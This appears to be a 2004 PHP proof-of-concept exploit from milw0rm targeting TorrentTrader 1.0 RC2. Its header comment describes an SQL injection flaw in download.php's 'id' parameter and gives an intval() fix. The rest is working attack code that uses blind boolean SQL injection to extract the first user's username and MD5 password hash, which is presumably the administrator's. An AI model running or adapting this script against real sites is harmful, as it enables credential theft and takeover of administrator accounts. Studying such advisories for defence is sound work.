#!/usr/bin/php 


<? 


/* 


TorrentTrader 1.0 RC2 SQL Injection Proof of Concept 
By aCiDBiTS acidbits_at_hotmail.com 31-August-2004 


"TorrentTrader (http://www.torrenttrader.com/) is a feature packed and 
highly customisable open-source BitTorrent tracker." 


This PoC dumps the username and password's md5 hash of first user in 
TorrentTrader web application database, that should be the administrator. 
First it fetchs a valid torrent id, then it determines if database's user 
can perform "union select" and finally obtains the username and 
md5(password). Tested on TorrentTrader 1.0 RC2, maybe older versions also 
vulnerable. 


Usage (in my debian box): 
php4 -q ./tt_sqli_poc.php "http://127.0.0.1/torrenttrade" 



++ Vulnerability description & workaround++ 


There is no user input sanization for parameter "id" in download.php prior 
beeing used in a SQL query. This can be exploited to manipulate SQL queries 
by injecting arbitrary SQL code. A workaround to solve this is to modify 
download.php, line13: 


$res = mysql_query("SELECT filename FROM torrents WHERE id = $id"); 


With: 


$res = mysql_query("SELECT filename FROM torrents WHERE id = 
".intval($id)); 



*/ 



echo "+----------------------------------------------------------+\n| 
TorrentTrader 1.0 RC2 SQL Injection Proof of Concept |\n| By aCiDBiTS 
acidbits_at_hotmail.com 31-August-2004 
|\n+----------------------------------------------------------+\n\n"; 



if($argc<2) die("Usage: ".$argv[0]." URL_to_TorrentTrader_script\n\n"); 
$host=$argv[1]; 
if(substr($host,strlen($host)-1,1)!='/') $host.='/'; 


echo "[+] Getting valid torrent id ... "; 
$webc=get_web($host); 
$temp=explode("torrents-details.php?id=",$webc); 
$id=intval($temp[1]); 
if( !$id ) die( "Failed!\n\n"); 
echo "OK\n Using Torrent id: $id\n\n"; 


echo "[+] Checking if injection is possible ... "; 
$bas=$id."%20and%200%20union%20select%201%20from%20users%20where%20"; 
if( test_cond( $bas."1" ) && !test_cond( $bas."0" ) ) echo " OK\n\n"; else 
die ("\n\n Failed! \n\n"); 


echo "[+] Getting username & password ... \n Username: "; 
get_field( "username"); 
echo "\n MD5(Password): "; 
get_field( "password" ); 


die("\n\n \ / \ /\n (Oo) Done! (oO)\n //||\\\\ 
//||\\\\\n\n"); 



function test_cond( $cond ) 
{ 
global $host; 
$res=get_web( $host."download.php?id=".$cond); 
if( eregi( "The ID has been found on the Database, but the torrent has 
gone!", $res ) ) 
return 1; 
else return 0; 
} 



function get_field( $field ) 
{ 
global $bas; 
$unval= " 0123456789ABCDEFGHIJKLMNOPRSTUVWXYZabcdefghijklmnopqrstuvwxyz"; 
$idx=1; 
$min=0; 
$max=strlen($unval); 
while($min!=$max) { 
$mid=$min+(($max-$min)/2); 
if( 
test_cond($bas."id=1%20and%20ord(substring($field,$idx,1))=".ord(substr($unval,$mid,1))) 
) { 
$idx++; 
echo substr($unval,$mid,1); 
$min=0; 
$max=strlen($unval); 
if( !test_cond($bas."id=1%20and%20ord(substring($field,$idx,1))") ) 
return; 
} else { 
if( 
test_cond($bas."id=1%20and%20ord(substring($field,$idx,1))<".ord(substr($unval,$mid,1))) 
) $max=$mid; 
else $min=$mid; 
} 
} 
die( "\n\nUnexpected error!\n\n"); 
} 



function get_web($url) 
{ 
$ch=curl_init(); 
curl_setopt ($ch, CURLOPT_URL, $url); 
curl_setopt ($ch, CURLOPT_HEADER, 0); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER,1); 
$data=curl_exec ($ch); 
curl_close ($ch); 
return $data; 
} 



/* \ / 
(Oo) 
//||\\ */ 


?>

# milw0rm.com [2004-09-01]